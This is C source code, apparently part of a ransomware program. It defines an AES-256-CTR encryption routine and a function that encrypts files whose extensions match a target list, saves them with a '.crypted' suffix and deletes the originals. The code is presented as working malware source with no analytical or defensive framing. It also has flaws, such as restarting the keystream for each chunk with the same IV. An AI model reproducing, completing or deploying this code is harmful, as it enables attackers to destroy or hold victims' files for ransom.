

#include "includes/plague.h"


int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;

    // Create and initialise the context.
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleError();

    // Initialise the encryption operation with 256 key size and 128 bits IV size.
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv))
        handleError();

    // Provide the message to be encrypted, and obtain the encrypted output.
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleError();
    ciphertext_len = len;

    // Finalise the encryption.
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleError();
    ciphertext_len += len;

    // free.
    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}

void encrypt_file(unsigned char key[], unsigned char iv[], const char *path)
{
    unsigned char clear_text[128];
    unsigned char encrypted_text[128];
    char *encrypted_filename;
    unsigned int size;
    FILE *fd, *crypted_fd;

    if (check_ext(path) == 0)   // If extension is not in list --> dont encrypt.
        return;
    if (!(fd = fopen(path, "rb")))
        handleError();
    encrypted_filename = str_concat(2, path, ".crypted");
    if (!(crypted_fd = fopen(encrypted_filename, "w")))
        handleError();
    while ((size = fread(clear_text, 1, sizeof(clear_text), fd)) > 0)
    {
        encrypt (clear_text, (int)size, key, iv, encrypted_text); // Encrypt the text.
        fwrite(encrypted_text, 1, size, crypted_fd);
    }
    fclose(crypted_fd);
    fclose(fd);
    free(encrypted_filename);
    remove(path);
}